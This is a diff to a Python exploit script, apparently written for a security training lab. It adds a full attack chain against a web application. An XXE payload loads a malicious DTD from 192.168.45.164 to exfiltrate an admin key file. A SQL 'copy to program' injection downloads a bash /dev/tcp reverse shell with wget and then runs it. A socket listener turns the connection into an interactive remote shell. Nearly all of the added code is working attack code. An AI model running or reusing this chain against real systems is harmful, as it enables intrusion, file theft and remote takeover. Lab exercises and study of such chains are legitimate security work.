@@ -9,6 +9,9 @@ import os
 import subprocess
 from bs4 import BeautifulSoup
 import re
+import threading
+import socket
+import time
 from multiprocessing import Pool
 
 s = requests.session()
@@ -209,42 +212,93 @@ def authenticate(username, password):
     return response.headers
 
 def XXE():
-    target = target + "/admin"
-    thistuple = (1, 3, 7, 8, 7, 5, 4, 6, 8, 5)
-    x = thistuple.count(5)
-    print(x)
+    host = target + "/admin/import"
+    data = {'preview': 'true',
+            'xmldata': '''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.45.164/malicious.dtd"> %xxe;]>
+<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>''',
+            }
+    s.post(host, data=data, proxies=proxies)
 
-def RCE():
-    thistuple = (1, 3, 7, 8, 7, 5, 4, 6, 8, 5)
-    x = thistuple.count(5)
-    print(x)
+def createReverseShellFile(lhost, lport):
+    script_content = f"""#!/bin/bash
+bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
+                        """
+    with open("reverse_shell.sh", "w") as file:
+        file.write(script_content)
+    print("Plik reverse_shell.sh został utworzony.")
 
-def runListener():
-    thistuple = (1, 3, 7, 8, 7, 5, 4, 6, 8, 5)
-    x = thistuple.count(5)
-    print(x)
+def uploadReverseShellFile(lhost,lport):
+    createReverseShellFile(lhost,lport)
+    url = f"{target}/admin/query"
+    data = {
+            "adminKey":"0cc2eebf-aa4b-4f9c-8b6c-ad7d44422d9b",
+            "query":f"copy (select 'a') to program 'wget -q {lhost}/reverse_shell.sh' -- -"
+            }
+
+    response = s.post(url, data=data, proxies=proxies)
+    time.sleep(2)  # import time
+    return response
+
+def TriggerReverseShellFile():
+    url = f"{target}/admin/query"
+    data = {
+            "adminKey":"0cc2eebf-aa4b-4f9c-8b6c-ad7d44422d9b",
+            "query":f"copy (select 'a') to program 'bash reverse_shell.sh' -- -"
+            }
+
+    response = s.post(url, data=data, proxies=proxies)
+    return response
+
+def runListener(lhost, lport):
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.bind((lhost, int(lport)))
+	s.listen(1)
+	print("[+] Reverse shell listening on port " + str(lport))
+	conn, addr = s.accept()
+	print('[+] Connection from ',addr)
+	conn.send("echo ' '\n".encode())
+	conn.recv(8192).decode()
+	conn.send("python3 -c 'import pty; pty.spawn(\"/bin/bash\");'\n".encode())
+	sys.stdout.write(conn.recv(8192).decode())
+	while True:
+		command = input()
+		if command == "exit":
+			conn.send("exit\n\exit\n".encode())
+			conn.recv(8192).decode()
+			conn.close()
+			sys.exit()
+		#Send command
+		command += "\n"
+		conn.send(command.encode())
+		time.sleep(0.5)
+		sys.stdout.write("\033[A" + conn.recv(8192).decode())
+
+def RCE(lhost, lport):
+    uploadReverseShellFile(lhost,lport)
+    TriggerReverseShellFile()
+
+
 
 def runWebserver():
     thistuple = (1, 3, 7, 8, 7, 5, 4, 6, 8, 5)
     x = thistuple.count(5)
     print(x)
 
-def createDTDFile():
-    dtd = '''
-            <!ENTITY % file SYSTEM "file:///home/student/adminkey.txt">
-            <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://192.168.45.164/?x=%file;'>">
-            %eval;
-            %exfiltrate;
-            '''
+def createDTDFile(lhost):
+    dtd = f'''<!ENTITY % file SYSTEM "file:///home/student/adminkey.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://{lhost}/get-data?xxe=%file;'>">
+%eval;
+%exfiltrate;'''
     if dtd:
         # Zapisz wartość parametru `user` do pliku
-        with open('malicious.dtd', 'a') as file:
+        with open('malicious.dtd', 'w') as file:
             file.write(dtd)
         return f'DTD: {dtd} zapisano do pliku'
     else:
         return 'No dtd provided', 400
 
-# Uruchomienie funkcji w odpowiedniej kolejności
+
 createTokenFile()
 startTime, stopTime = getEpochTime()
 generateTokens(startTime, stopTime)
@@ -273,6 +327,17 @@ finally:
 password = read_cracked_password(output_file)
 print("[+] Cracked Password: " + password)
 authenticate("admin", password)
+
+createDTDFile("192.168.45.164")
+XXE()
+print("Now, run the FLASK SERVER in another terminal: python3 server.py")
+
+listener_thread = threading.Thread(target=runListener, args=("192.168.45.164", "4444"))
+listener_thread.start()
+
+RCE("192.168.45.164", "4444")
+
+listener_thread.join()
 
 #crack_sha1_hash("oxloQ7JK1hmHw9FF8tai1n5TolY=", "/usr/share/wordlists/rockyou.txt")
 
